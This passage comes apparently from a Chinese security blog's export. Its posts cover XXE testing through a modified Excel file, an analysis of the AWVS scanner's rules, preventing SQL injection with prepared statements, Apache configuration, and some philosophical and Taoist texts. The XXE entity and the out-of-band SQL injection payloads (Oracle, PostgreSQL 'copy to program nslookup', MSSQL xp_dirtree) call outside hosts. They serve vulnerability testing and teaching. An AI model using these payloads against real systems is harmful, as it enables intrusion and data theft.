入门假设我们有一个接受Excel文件进行上传和处理的目标应用程序，我们就可以开始探测XXE了。相同的攻击有效负载可能会起作用，我们只需将它们放入Excel文件即可。创建一个新的空白Excel文件。你可以在某些单元格中键入内容，但实际上并不是必需的。如果您没有安装Excel？您可以使用Google表格，然后下载为xlsx。创建一个目录以将Excel文件解压缩并解压缩。 123456789101112$ mkdir XXE &amp;&amp; cd XXE$ unzip ../XXE.xlsx # obviously use whatever your xlsx file is hereArchive: ../XXE.xlsx inflating: xl/drawings/drawing1.xml inflating: xl/worksheets/sheet1.xml inflating: xl/worksheets/_rels/sheet1.xml.rels inflating: xl/sharedStrings.xml inflating: xl/styles.xml inflating: xl/workbook.xml inflating: xl/_rels/workbook.xml.rels inflating: _rels/.rels inflating: [Content_Types].xml 用于攻击应用程序的文件会有所不同，这在很大程度上取决于所使用的库。xl/workbook.xml提供了工作簿内容的概述，通常是大多数解析开始的地方，因为它将包含工作表及其名称的列表。单个工作表本身位于xl/worksheets目录下，通常内容最终会进入xl/sharedStrings.xml。 我在实际中发现了这一点，大多数应用程序似乎都会使用xl/workbook.xmlXML解析器来获取工作表列表，然后分别读取每个工作表以获取单元格内容。我还没有找到任何易受细胞影响的应用程序，但您的里程可能会有所不同。 鉴于这种方法，根据经验，通常最好先尝试xl/workbook.xml，这就是我将在这篇文章中展示的内容。就像将XXE有效负载添加到此文件一样简单，将内容压缩回Excel文件并将其上传到应用程序。 0x03 使用BURP COLLABORATOR对XXE进行盲测在我们的演示应用程序中，无法将数据检索到HTTP响应中，因此所有这些XXE发现和利用都将是盲目的。我喜欢使用Burp Collaborator进行初始测试，因为阻止出站HTTP请求但允许DNS查询的情况并不少见。使用Collaborator我们可以看到两种交互并确认漏洞，即使我们可能无法轻易利用它。 打开Burp Suite Professional，单击Burp菜单并选择“Burp Collaborator client”将其打开。单击“复制到剪贴板”。就我而言，值是gtdwmy7gvrncy5rvfu11kxzl2c82wr.burpcollaborator.net。现在我们将其插入到XML中。打开xl/workbook.xml并将以下内容插入第2行和第3行。确保从Burp中粘贴你的值，而不是下面显示的值。: 12&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM &quot;http://gtdwmy7gvrncy5rvfu11kxzl2c82wr.burpcollaborator.net/&quot;&gt; ]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 你的xl/workbook.xml现在会是像这样。现在将其压缩以创建新的Excel文件。 1234567891011121314151617$ zip -r ../poc.xslx *updating: [Content_Types].xml (deflated 71%)updating: _rels/ (stored 0%)updating: _rels/.rels (deflated 60%)updating: docProps/ (stored 0%)updating: docProps/app.xml (deflated 51%)updating: docProps/core.xml (deflated 50%)updating: xl/ (stored 0%)updating: xl/workbook.xml (deflated 56%)updating: xl/worksheets/ (stored 0%)updating: xl/worksheets/sheet1.xml (deflated 53%)updating: xl/styles.xml (deflated 60%)updating: xl/theme/ (stored 0%)updating: xl/theme/theme1.xml (deflated 80%)updating: xl/_rels/ (stored 0%)updating: xl/_rels/workbook.xml.rels (deflated 66%)updating: xl/sharedStrings.xml (deflated 17%) 现在将此poc.xlsx上传到你的应用程序。在这种情况下，有一个简单的ReactJS演示应用程序，它允许我们将文件拖入。你的应用程序应该会有所不同，但都是一个方式。现在检查您的Burp Collaborator客户端，看看您是否有任何点击。成功。我们已确认XXE。 0x04 总结通过Excel利用XML外部攻击非常简单，一旦你找到它，基本上你通常使用的任何盲技术都将与更标准的HTTP请求一样利用。 防御：将poi架包升级至 3.17就可以解决 本文是EXPLOITING XXE WITH EXCEL的翻译文章 https://xz.aliyun.com/t/3741","link":"/2020/09/24/%E5%88%A9%E7%94%A8EXCEL%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/"},{"title":"对AWVS一次简单分析","text":"一）前言最近对awvs进行一些简单研究，众所周知awvs的非常好用的扫描器。强大的爬扫能力让很多人很喜欢他，不过强大的话也对应有它的缺点，第一，体积庞大，扫描耗时间太久；第二，无法跨平台，只能让windows来用。不过这个几个缺点对这个牛逼的扫描器貌似也没啥影响，还是很多人爱用。 不过对扫描器来说核心还是规则，我们还是可以重点分析一下awvs的扫描规则。 二）咋分析？1.搭建环境，抓流量进行分析一个web狗，不会分析二进制。所以我只能抓包来分析了。 搭建一个漏洞url地址（这里只要一个url就够了，多了payload就太多不好分析了）用burp来抓，设置好burp的代理地址(proxy-options-proxy listeners-add)。在awvs中在设置一下扫描器的使用的代理地址为burp就可以开心的抓包了。 简单的抓包,可以大体的看成来awvs都做哪些扫描，而且我们可以找到一些马上可以用规则，比如破壳漏洞，文件读取，备份文件扫描，敏感文件扫描，ssrf，头注入等等。 2.script源码分析和调试但是分析了一波流量，还是感觉很多payload找不到规则(比如sql注入的逻辑，jboss的漏洞匹配规则等等)。于是看了一下awvs的安装目录发现有一个data/scripts目录，里面有很多加密的文件，不用说了一定是扫描规则。 于是开始在网上找有没有人做过这个的相关破解工作，发现还真有:http://blog.oowoodone.com/archives/2016/03/30/wvs_script_decode/http://gv7.me/articles/2017/Writing-AWVS-scripts-to-detect-Web-Services/ 问了一下博主要了一下规则，他就直接把规则同步github https://github.com/c0ny1/awvs_script_decode 这种“前人种树，后人乘凉”的感觉还是很舒服的，所以自己以后也要多种种”树“. 打开规则一开全是类似javascript的脚本，直接看还是有点难懂。如果最好能运行并调试起来就美滋滋了。去搜索了一下官方的关于script的文档发现，awvs提供了编写script脚本的接口。 http://www.acunetix.com/download/tools/WVSSDK.zip 解压以后里面有一个使用文档，根据文档就明白很多了。 根据文档我们可以知道: 123456789101.awvs提供了wvs scripting程序给我们进行自定义的脚本编写，我们可以用它来对这些脚本进行调试，(只需要把这个文件拷贝到awvs的安装目录即可)。2.awvs 提供了script可用api，在https://www.acunetix.com/resources/sdk/种可以进行查看。3.script的几个脚本目录是根据扫描的特点进行分类的： 3.1.includes 头文件，用于常量声明，生产随机数 和md5加密等等，很多扫描的匹配规则会在这里定于这个文件 3.2.network 主机的漏洞扫描 个人感觉非重点 比较avws是搞web扫描出名的。 3.3.PerFile 在文件名上的加payload测试，比如根据文件名扫备份文件扫描，破壳漏洞扫描等，个人理解就是根据uri进行一些参数扫描 3.4.PerFolder 根据目录型的url 进行一些扫描 比如敏感目录泄漏扫描，敏感文件泄漏扫描，git泄露扫描等。 3.5.PerScheme awvs将有参数传递的url称为Scheme，所以这个目录就是在各个参数传入点设置扫描payload进行对应的漏洞测试。比如命令执行漏洞，代码执行漏洞，xss漏洞扫描，sql漏洞扫描等等。（我们可以在这个目录中学到很多规则和漏洞扫描姿势。） 3.6.PerServer 一般用于测试第三方中间件，包括指纹识别，只最开始扫描的时候进行一次。比如Flask_Debug 打开，jboss各种漏洞，tomcat各种漏洞等。 3.7 WebApps 第三方cms漏洞扫描。比如wordpress的漏洞扫描，joolma漏洞扫描等等 下面以/Scripts/PerFile/Bash_RCE.script作为一个调试案例： 使用wvs scripting打开/Scripts/PerFile/Bash_RCE.script文件。 点击小齿轮，设置扫描目标： 这里比较蛋疼就是不能直接输入扫描的目标（反正我没找到），需要去load一下awvs爬虫保存的.cwl文件。我们在awvs上简单爬一下扫描的目标，然后保存成xxx.cwl。再通过wvs scripting去load这个文件。 最后是运行，这里具体根据script来确定set target的什么类型，比如Bash_RCE.script，中用了var file = getCurrentFile()，你就需要set file target，最后run per file。（当然还有其他的就不再举例子了) 到这里我们就可以跑起每个脚本进行运行调试了，能跑起来，我们就可以去logInfo一些东西，这样去看脚本都做哪些操作就简单多了。 tip:那么我们可以一个一个目录的去分析每个脚本，当然也有一个小技巧去提前分析高危的扫描脚本。那就是先用awvs去扫一下他的测试站点:http://testphp.vulnweb.com/ ,awvs会告诉你是哪个脚本发现的漏洞和且匹配到的内容，这样我们就挑选自己最先想研究的漏洞来看。(不过要注意这个testphp测试站点，awvs默认启动了AcuSensor Technology技术 https://www.acunetix.com/vulnerability-scanner/acusensor-technology/ 如果你要用它做测试站点的话，代码逻辑会走到acusensor对应的代码) 三）从awvs学到啥1.扫描方式awvs在扫描前，都会对url进行的详细的分类和参数的解析。常见为:file,folder,scheme等类型。几乎每种类型的url都会有一个目录对他进行专门的漏洞扫描。 在扫描前对url进行比较细致的分类是可以学习一波的，特别是对scheme类型的url进行参数解析。大部分的扫描都会有这部分的参数解析，不过一般都是类似于(a=b&amp;c=1的这种解析)，但是如果参数是json格式的(b=1&amp;c={“uname”:”wilson”,”id”:”23333”}) ,很多扫描器不支持，不过大家可以参加一下sqlmap的json格式解析(walk方法，https://github.com/sqlmapproject/sqlmap/blob/master/lib/core/common.py) 至于每种类型的url都会有一个目录对它进行专门的漏洞扫描方式的话，你也可能选择用一个脚本去处理一类漏洞类型，然后对这个漏洞类型可能在哪种url类型出现进行测试。 2.规则，大把大把的规则看到代码最大的好处就是可以看到他的匹配正则了，比如敏感部署文件备份匹配规则，任意文件读取规则，sql报错注入关键字匹配，命令执行等等。 更多规则见脚本。 3.AcuMonitor 技术https://www.acunetix.com/vulnerability-scanner/acumonitor-technology/ 这东西简单理解就是和你的dnslong一样的，适用于扫描无回显的漏洞，比如： 12345678Blind Server-side XML/SOAP InjectionBlind XSS (also referred to as Delayed XSS)Host Header AttackOut-of-band Remote Code Execution (OOB RCE)Out-of-band SQL Injection (OOB SQLi)SMTP Header InjectionServer-side Request Forgery (SSRF)XML External Entity Injection (XXE) 我们可以在脚本中找到他们的规则： 那么重点是怎么把漏洞和对应url关联?? 我的处理是让漏洞服务器发起http请求，将urlid带到uri中，比如 http://blog.wils0n.cn/urlid/param/cveid 根据这uri中的urlid进行定位url参数。但是这样会还是会有一些漏扫，比如ssrf只出现在http的host中，uri并不会带入请求。 所以比较准确一个是使用dns来做。例如:nslookup dns.urlid-param-cveid.wils0n.cn，在服务端上根据urlid-param-cveid来处理漏洞。 关于dnslog service的搭建： 1234567891011使用方法一)一个服务器工具：https://github.com/Wyc0/DNSLog/blob/master/dns.py(简单，一个脚本就够了)触发方法：nslookup urlid-param-cveid.wils0n.cn 服务器的ip这种方法必须指定后面的ip。使用方法二）一个服务器加一个域名：域名设置(请教了@izy和@凤凰)用阿里云的为例子：1.设置一个a记录。ns1.wils0n.cn ---&gt;你的服务ip假如 118.11.11.112.设置一个ns记录。 dns.wils0n.cn ---&gt;ns1.wils0n.cn 存在的问题： 问题1）没有响应包回复，导致请求会一直发，可以参考https://github.com/BugScanTeam/DNSLog/blob/master/dnslog/zoneresolver.py 进行改进一下。 问题2) url跳转扫描可能会导致误报的情况出现，由于dns请求会绕过很多跳，所以根据扫描ip来判断是无法做到，暂时不知道怎么解决。。。不过误报会比漏报好一些 4.awvs的网站目录和文件扫描思路很多web扫描器的开始都是对url进行网站目录和文件扫描，然后再结合爬虫一起爬一下。 因为大家的想法都是：“不管有没有漏洞，我先扫一遍目录再说”，所以网上这种爬目录文件的工具极其多。 看了一下网上的工具的逻辑大概是: 123451.取一个不可能存在的url，判断是不是存在404的状态码。 存在的404话，下面的判断只要根据状态码来判断是否存在就好了。 不存在的话走下面2的逻辑。2.获取该不存在url的相应内容，作为一个404不存在的页面标示，接下去的扫描如果获取到页面不和这个404表示一样的就认为是200的存在页面。 这个思路在大部分情况下面用。但是有些站点，你会发现扫到一堆200的误报。分析为什么： 123在逻辑1中，404的判断取一个不存在的url是不够的，你需要取多个，因为有的站点xxxx.php是404，而xxxx.jsp就变成200了。在逻辑2中，有种情况是这个404的页面是会不断变化的，比如淘宝的404页面中，下面会出现不同的链接商品推荐。这样就会产生一大堆的误报。 那么我们分析一下awvs的目录和文件扫描姿势:（Backup_File.script，Sensitive_Files.script, Possible_Sensitive_Directories ,Possible_Sensitive_Files ） 123456第一）在Backup_File和Sensitive_Files中看到能用正则匹配的，先用规则来匹配，这个比较准确，误报低。第二) Backup_File中我们发现，awvs的再解决逻辑2中出现的问题时候，用了一个小的tip:在发现页面内容和404标示不一样的时候，再去取了一个不存在的url2获取新的404标示，然后判断两个标示是不是一样，一样的话说明这个200扫描没用问题，从而去掉这个误报。第三) 在Possible_Sensitive_Directories ,Possible_Sensitive_Files中，我们发现awvs去掉了逻辑2。只对存在404的url进行目录和文件扫描。而目录扫描和文件扫描的逻辑不一样的，我们发现当一个文件存在时候返回时200，但是当一个目录存在的时候确是302跳转，我们需要匹配http头的Location进行判断。那么网上那些扫描目录工具不就2b了么？这里其实要说到一个坑，这些工具都是使用了python的requests库，这个库默认是会进行url跟随跳转的。所以他们没有必要区分扫描目录和文件扫描。如果你把requests中设置了allow_redirects=False，那你就要去自己匹配http头的Location关键字。 个人感觉扫目录逻辑走第一和第三就可以了。 5.sql注入检查可能很多人都会用sqlmap来做注入检查，但是sqlmap还是有点大，扫描payload比较多，扫描时间长。 awvs的sql注入也可以参考一下: 1.基于错误返回信息的关键字直接判断为存在sql注入漏洞。(Sql_Injection.script)主要匹配的关键字有: 1You have an error in your SQL syntax|The database has encountered a problem|database error|unknown column\\\\s|SQL syntax.*MySQL|Warning.*mysql_.*|(Incorrect\\ssyntax\\snear\\s'[^']*')|.....(很多大家去对应脚本里面找) 这样匹配的话，还是比较准确的，但是有的时候会有误报。 2.盲注入(Blind_Sql_Injection.script)2.1 bool型的盲注入 我把这部分的扫描逻辑理了一下，大概是这样的： 判断参数是不是有效的，即：输入和原来的值不一样的参数时候，页面(过滤过的，过滤了html标签，当前输入值，原始输入值)是否一样 如果参数有效，就用 and payload 判断是不是存在漏洞(多个判断) 如果参数无效，就用 or payload 判断是不是存在漏洞(多个判断) 我参考以后，发现它会有一些漏扫描，比如 数字型等带有单引号的注入。 然后我决定优化一下，并去掉第三步的验证。因为一般都无有效参数的，无效的参数一般不做检查了，而且or注入可能会导致一些误报等。 2.2 基于时间盲注入 原理很简单，然后数据库去sleep一段时间。payload对应脚本里面找，或者可以参考一下sqlmap的。 然后就是注意各种闭合，比如: ‘, “, ), )), ‘), “), ‘)), “)), ;, 等等 个人的实践告诉我，基于时间的注入检查是最准确的。如果你是甲方的话，基于时间盲注入应该是最适合你的了。因为你可以去监控mysql的慢日志或者异常日志去查询sleep登关键字来结合着一起发现sql注入漏洞，我在实践中是有用这种方法发现过一些比较隐蔽的sql注入的。 3.结合AcuMonitor盲打测试oracle的注入: 1xxxx||UTL_INADDR.get_host_address('{DOMAIN}') PostgreSQL: 1{ORIGVALUE};copy (select '') to program 'nslookup {DOMAIN} windows +mssql: 1{ORIGVALUE};EXEC master..xp_dirtree '\\\\{DOMAIN}\\' -- 同样，也要注意各种闭合。 6.xxe 优化xxe漏洞检测，改变Content-type头（text/xml，application/xml），可能会测出漏洞。 更多脚本还在分析 ……. 四）结尾很多挺好玩的漏洞扫描知识，因为文章篇幅和时间精力问题就没有进行更多分析了，大家可以自己去找自己感觉好用的script进行debug和逻辑分析。分析到好的思路也可以分享出来看看。 https://paper.seebug.org/461/#1sqlsql_injectionscript","link":"/2020/10/11/%E5%AF%B9AWVS%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"},{"title":"论道","text":"皮相皮相，即表面、浅层次。 人的能耐常被分为“道”和“术”两类。“道”的层次高，“术”的层次低，属于皮相。这种分类我很赞同。不过，坐而论道，必先有术。不学无术而论道者，穷则独欺其身，达则兼害天下。 在《神雕侠侣》中，觉远把《九阳真经》也称作“皮相小道之学”。我们凡人，能识得万物皮相，习得一两样皮相小道，就很不容易。如能更进一步，当然很好。如果不能，安于皮相，不妄谈玄虚，也算做了个本分人。 所以，先从皮相开始。 转自皮相公众号 《传习录》​ –王守仁 无善无恶心之体，有善有恶意之动。知善知恶是良知，为善去恶是格物。 绩效只有功劳才会产生绩效，苦劳不产生绩效。只有能力才会产生绩效，态度必须转化为能力才会产生绩效。才干才产生绩效，品德需要转化为才干才会产生绩效。你可以不努力，但是请不要影响他人。 市场永远是对的 鲁迅愿中国青年都摆脫冷气，只是向上走，不必听自暴自弃者流的话。能做事的做事，能发声的发声。有一分热，发一分光。就令萤火一般，也可以在黑暗里发一点光，不必等候炬火 。 游族再见少年 你，看透不美好仍相信美好，见过不善良却依旧善良。 我们，会在一起，继续善良，继续相信美好，继续和一切不善良战斗。 全体族人 2020年12月25日 ​ 非你莫属 李晨居人上者，视人为人。居人下者，视己为人。 北京 发光发亮为众人抱薪者，不可使其冻毙于风雪为自由开路者，不可使其困顿于荆棘为大众谋福利者，不可使其孤军奋战为世人谋生者，不可使其葬于人心为大众性命相托者，不可使其命无所托","link":"/2019/11/08/%E8%AE%BA%E9%81%93/"},{"title":"道家《清心咒》","text":"《冰心诀》 心若冰清，天塌不惊。 万变犹定，神怡气静。 尘垢不沾，俗相不染。 虚空甯宓，混然无物。 无有相生，难易相成。 份与物忘，同乎浑涅。 天地无涯，万物齐一。 飞花落叶，虚怀若谷。 千般烦忧，才下心头。 即展眉头，灵台清悠。 心无罣碍，意无所执。 解心释神，莫然无魂。 水流心不惊，云在意俱迟。 一心不赘物，古今自逍遥。 《清心诀》 清心如水，清水即心。 微风无起，波澜不惊。 幽篁独坐，长啸鸣琴。 禅寂入定，毒龙遁形。 我心无窍，天道酬勤。 我义凛然，鬼魅皆惊。 我情豪溢，天地归心。 我志扬迈，水起风生！ 天高地阔，流水行云。 清新治本，直道谋身。 至性至善，大道天成！ 《静心诀》 冰寒千古，万物尤静 心宜气静，望我独神 心神合一，气宜相随 相间若余，万变不惊 无痴无嗔，无欲无求 无舍无弃，无为无我","link":"/2020/01/19/%E9%81%93%E5%AE%B6%E3%80%8A%E6%B8%85%E5%BF%83%E5%92%92%E3%80%8B/"},{"title":"预编译防止百分之95的SQL注入","text":"数据库预编译起源（1）数据库SQL语句编译特性： 数据库接受到sql语句之后，需要词法和语义解析，优化sql语句，制定执行计划。这需要花费一些时间。但是很多情况，我们的一条sql语句可能会反复执行，或者每次执行的时候只有个别的值不同（比如query的where子句值不同，update的set子句值不同,insert的values值不同）。 （2）减少编译的方法 如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。为了解决上面的问题，于是就有了预编译，预编译语句就是将这类语句中的值用占位符替代，可以视为将sql语句模板化或者说参数化。一次编译、多次运行，省去了解析优化等过程。 （3）缓存预编译 预编译语句被DB的编译器编译后的执行代码被缓存下来,那么下次调用时只要是相同的预编译语句就不需要编译,只要将参数直接传入编译过的语句执行代码中(相当于一个涵数)就会得到执行。 并不是所以预编译语句都一定会被缓存,数据库本身会用一种策略（内部机制）。 (4) 预编译的实现方法 预编译是通过PreparedStatement和占位符来实现的。 预编译作用 预编译阶段可以优化 sql 的执行 预编译之后的 sql 多数情况下可以直接执行，DBMS 不需要再次编译，越复杂的sql，编译的复杂度将越大，预编译阶段可以合并多次操作为一个操作。可以提升性能。 防止SQL注入 使用预编译，而其后注入的参数将不会再进行SQL编译。也就是说其后注入进来的参数系统将不会认为它会是一条SQL语句，而默认其是一个参数，参数中的or或者and 等就不是SQL语法保留字了。 如何开启预编译（1）数据库是否默认开启预编译和JDBC版本有关。 也可以配置jdbc链接时强制开启预编译和缓存:useServerPrepStmts和cachePrepStmts参数。预编译和预编译缓存一定要同时开启或同时关闭。否则会影响执行效率 1conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/prepare_stmt_test?user=root&amp;password=root&amp;useServerPrepStmts=true&amp;cachePrepStmts=true&quot;); （2）mysql的预编译 开启了预编译缓存后，connection之间，预编译的结果是独立的，是无法共享的，一个connection无法得到另外一个connection的预编译缓存结果。 经过试验，mysql的预编译功能对性能影响不大，但在jdbc中使用PreparedStatement是必要的，可以有效地防止sql注入。 相同PreparedStatement的对象 ，可以不用开启预编译缓存。 12345678910111213 conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/prepare_stmt_test?user=root&amp;password=root&amp;useServerPrepStmts=true&quot;); PreparedStatement stmt = conn.prepareStatement(sql); stmt.setString(1, &quot;aaa&quot;); ResultSet rs1 = stmt.executeQuery();//第一次执行 s1.close(); stmt.setString(1, &quot;ddd&quot;); ResultSet rs2 = stmt.executeQuery();//第二次执行 rs2.close(); stmt.close(); //查看mysql日志 1 Prepare select * from users where name = ? 1 Execute select * from users where name = 'aaa' 1 Execute select * from users where name = 'ddd' mybatis是如何实现预编译的mybatis 默认情况下，将对所有的 sql 进行预编译。mybatis底层使用PreparedStatement，过程是先将带有占位符（即”?”）的sql模板发送至mysql服务器，由服务器对此无参数的sql进行编译后，将编译结果缓存，然后直接执行带有真实参数的sql。核心是通过#{ } 实现的。 在预编译之前，#{ } 解析为一个 JDBC 预编译语句（prepared statement）的参数标记符?。 1234//sqlMap 中如下的 sql 语句select * from user where name = #{name};//解析成为预编译语句select * from user where name = ?; 如果${ }，SQL 解析阶段将会进行变量替换。不能实现预编译。 123select * from user where name = '${name}'//传递的参数为 &quot;ruhua&quot; 时,解析为如下，然后发送数据库服务器进行编译。select * from user where name = &quot;ruhua&quot;; JDBC预编译过程两个重要参数1useServerPrepStmts=true&amp;&amp;cachePrepStmts=true 首先来看不加cachePrepStmts=true参数的情况，如下: JDBC中原url配置语句**1url=jdbc:mysql://127.0.0.1:3306/mjduan?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false 服务器端MySQL的general日志里面内容如下: ​ 执行的三条语句被打印出来了 1234562018-06-12T23:37:54.142048Z 10 Query SET NAMES utf82018-06-12T23:37:54.143931Z 10 Query SET character_set_results = NULL2018-06-12T23:37:54.145705Z 10 Query SET autocommit=12018-06-12T23:37:54.210026Z 10 Query SELECT id,name,age FROM student WHERE id = 12018-06-12T23:37:54.236635Z 10 Query SELECT id,name,age FROM student WHERE id = 12018-06-12T23:37:54.239985Z 10 Query SELECT id,name,age FROM student WHERE id = 1 JDBC连接的url中添加useServerPrepStmts=true**1url=jdbc:mysql://127.0.0.1:3306/mjduan?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;&amp;useServerPrepStmts=true 在如下日志中，每个Ececute之前都有一个Prepare，说明执行SQL之前，都对该SQL进行解析、优化了，所以没有起到预编译的作用。 123456789101112132018-06-12T23:29:34.175252Z 5 Query SET NAMES utf82018-06-12T23:29:34.176954Z 5 Query SET character_set_results = NULL2018-06-12T23:29:34.178768Z 5 Query SET autocommit=12018-06-12T23:29:34.214910Z 5 Prepare SELECT id,name,age FROM student WHERE id = ?2018-06-12T23:29:34.244389Z 5 Execute SELECT id,name,age FROM student WHERE id = 12018-06-12T23:29:34.265083Z 5 Close stmt2018-06-12T23:29:34.266680Z 5 Prepare INSERT INTO student(name,age) VALUES(?, ?)2018-06-12T23:29:34.268304Z 5 Query select @@session.tx_read_only2018-06-12T23:29:34.275772Z 5 Execute INSERT INTO student(name,age) VALUES('明明', 20)2018-06-12T23:29:34.283289Z 5 Close stmt2018-06-12T23:29:34.284142Z 5 Prepare SELECT id,name,age FROM student WHERE id = ?2018-06-12T23:29:34.285013Z 5 Execute SELECT id,name,age FROM student WHERE id = 12018-06-12T23:29:34.287157Z 5 Close stmt **JDBC连接的url加上useServerPrepStmts=true&amp;cachePrepStmts=true**1url=jdbc:mysql://127.0.0.1:3306/mjduan?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;&amp;useServerPrepStmts=true&amp;cachePrepStmts=true 再去看MySQL的general日志，如下，这次生效了。 执行三条一样的语句，只有一次Prepare 12345672018-06-12T23:44:03.197228Z 11 Query SET NAMES utf82018-06-12T23:44:03.202524Z 11 Query SET character_set_results = NULL2018-06-12T23:44:03.206439Z 11 Query SET autocommit=12018-06-12T23:44:03.310079Z 11 Prepare SELECT id,name,age FROM student WHERE id = ?2018-06-12T23:44:03.378740Z 11 Execute SELECT id,name,age FROM student WHERE id = 12018-06-12T23:44:03.427651Z 11 Execute SELECT id,name,age FROM student WHERE id = 12018-06-12T23:44:03.431207Z 11 Execute SELECT id,name,age FROM student WHERE id = 1 小总结1、jdbc链接时强制开启预编译和缓存:useServerPrepStmts和cachePrepStmts参数。预编译和预编译缓存一定要同时开启或同时关闭。否则会影响执行效率。 2、 预编译功能只是在同一个Connection中生效，一个Connection无法获取另一个Connection中的预编译结果。 3、使用Mybatis时，预编译功能只在同一个SqlSession中生效？这种说法不对，俩个SqlSession有可能拿到的是同一个Connection(因此DataSource)，这个时候这俩个SqlSession就能共享该Connection中的预编译结果。 4、MyBatis是对JDBC的封装，MyBatis是一个支持普通SQL查询，存储过程和高级映射的优秀持久层框架。 预编译只能防止百分之95的sql注入为什么预编译只能防95%防sql注入都用参数化的方法，但是有些地方是不能参数化的。 比如order by后就不能参数化，一般挖sql注入时找有排序功能需求的位置（比如博客常按时间排序），基本十之六七都能挖到sql注入。 典型的java写的sql执行代码片段如下： 123456789101112Connection conn = DBConnect.getConnection();PreparedStatement ps = null;ResultSet rs=null;String sql = &quot; SELECT passwd FROM test_table1 WHERE username = ? &quot;;ps = conn.prepareStatement(sql);# 通过setString()指明该参数是字符串类型ps.setString(1, username);# 另外还有setInt()等一些其他方法# ps.setInt(2, test_param);rs = ps.executeQuery(); ps.setString(1, username)会自动给值加上引号。比如假设username=“ls”，那么拼凑成的语句会是String sql = “ SELECT passwd FROM test_table1 WHERE username = ‘ls’ “; 再看order by，order by后一般是接字段名，而字段名是不能带引号的，比如 order by username；如果带上引号成了order by ‘username’，那username就是一个字符串不是字段名了，这就产生了语法错误。 所以order by后不能参数化的本质是：一方面预编译又只有自动加引号的setString()方法，没有不加引号的方法；而另一方面order by后接的字段名不能有引号。（至于为什么不弄个能不自动加引号的set方法那就不太懂了） 更本质的说法是：不只order by，凡是字符串但又不能加引号的位置都不能参数化；包括sql关键字、库名表名字段名函数名等等。 不能被参数化防止sql注入方法不能参数化的位置，不管怎么拼接，最终都是和使用“+”号拼接字符串的功效一样：拼成了sql语句但没有防sql注入的效果。 但好在的一点是，不管是sql关键字，还是库名表名字段名函数名对于后台开发者来说他的集合都是有限的，更准确点应该说也就那么几个。 这时我们应可以使用白名单的这种针对有限集合最常用的处理办法进行处理，如果传来的参数不在白名单列表中，直接返回错误即可。 代码类似如下： 123456789if para_str.equals(&quot;key_str1&quot;){ ...;}else if test_str.equals(&quot;key_str2&quot;){ ...;}else{ throw new Exception(&quot;parameter error.&quot;);} 关键词1、SQLite数据库不支持预编译 2、能否预编译是数据库的特性，由后台配置决定是否预编译。 3、 预编译是通过PreparedStatement和占位符来实现的 4、一般挖sql注入时找有排序功能需求的位置（比如博客常按时间排序），使用的是order by语句，不可以被预编译。 5、不只order by，凡是字符串但又不能加引号的位置都不能参数化；包括sql关键字、库名表名字段名函数名等等。 https://www.jianshu.com/p/9972d7b33061 https://my.oschina.net/u/2518341/blog/1830366 https://www.cnblogs.com/lsdb/p/12084038.html","link":"/2020/12/27/%E9%A2%84%E7%BC%96%E8%AF%91%E9%98%B2%E6%AD%A2%E7%99%BE%E5%88%86%E4%B9%8B95%E7%9A%84SQL%E6%B3%A8%E5%85%A5/"},{"title":"Apache配置及优化","text":"Apache的配置由httpd.conf文件配置，因此下面的配置指令都是在httpd.conf文件中修改。 1、 主站点基本配置: ServerRoot “/mnt/software/apache2” #你的apache软件安装的位置。其它指定的目录如果没有指定绝对路径，则目录是相对于该目录。 PidFile logs/httpd.pid #第一个httpd进程(所有其他进程的父进程)的进程号文件位置。 Listen 80 #服务器监听的端口号。 ServerName www.clusting.com:80 #主站点名称（网站的主机名）。 ServerAdmin admin@clusting.com #管理员的邮件地址。 DocumentRoot “/mnt/web/clusting” #主站点的网页存储位置。 以下是对主站点的目录进行访问控制： 123456&lt;Directory &quot;/mnt/web/clusting&quot;&gt; Options FollowSymLinks AllowOverride None Order allow,deny Allow from all &lt;/Directory&gt; 在上面这段目录属性配置中，主要有下面的选项： Options：配置在特定目录使用哪些特性，常用的值和基本含义如下： ExecCGI: 在该目录下允许执行CGI脚本。 FollowSymLinks: 在该目录下允许文件系统使用符号连接。 Indexes: 当用户访问该目录时，如果用户找不到DirectoryIndex指定的主页文件(例如index.html),则返回该目录下的文件列表给用户。 SymLinksIfOwnerMatch: 当使用符号连接时，只有当符号连接的文件拥有者与实际文件的拥有者相同时才可以访问。 其它可用值和含义请参阅：http://www.clusting.com/Apache/ApacheManual/mod/core.html#options AllowOverride：允许存在于.htaccess文件中的指令类型(.htaccess文件名是可以改变的，其文件名由AccessFileName指令决定)： None: 当AllowOverride被设置为None时。不搜索该目录下的.htaccess文件（可以减小服务器开销）。 All: 在.htaccess文件中可以使用所有的指令。 其他的可用值及含义(如：Options FileInfo AuthConfig Limit等)，请参看： http://www.clusting.com/Apache/ApacheManual/mod/core.html#AllowOverride Order：控制在访问时Allow和Deny两个访问规则哪个优先： Allow：允许访问的主机列表(可用域名或子网，例如：Allow from 192.168.0.0/16)。 Deny：拒绝访问的主机列表。 更详细的用法可参看：http://www.clusting.com/Apache/ApacheManual/mod/mod_access.html#order DirectoryIndex index.html index.htm index.php #主页文件的设置（本例将主页文件设置为：index.html,index.htm和index.php） 2、Apache配置文件2、 服务器的优化 (MPM: Multi-Processing Modules)apache2主要的优势就是对多处理器的支持更好，在编译时同过使用–with-mpm选项来决定apache2的工作模式。如果知道当前的apache2使用什么工作机制，可以通过httpd -l命令列出apache的所有模块，就可以知道其工作方式： prefork：如果httpd -l列出prefork.c，则需要对下面的段进行配置。 StartServers 5 #启动apache时启动的httpd进程个数。 MinSpareServers 5 #服务器保持的最小空闲进程数。 MaxSpareServers 10 #服务器保持的最大空闲进程数。 MaxClients 150 #最大并发连接数。 MaxRequestsPerChild 1000 #每个子进程被请求服务多少次后被kill掉。0表示不限制，推荐设置为1000。 在该工作模式下，服务器启动后起动5个httpd进程(加父进程共6个，通过ps -ax|grep httpd命令可以看到)。当有用户连接时，apache会使用一个空闲进程为该连接服务，同时父进程会fork一个子进程。直到内存中的空闲进程达到MaxSpareServers。该模式是为了兼容一些旧版本的程序。我缺省编译时的选项。 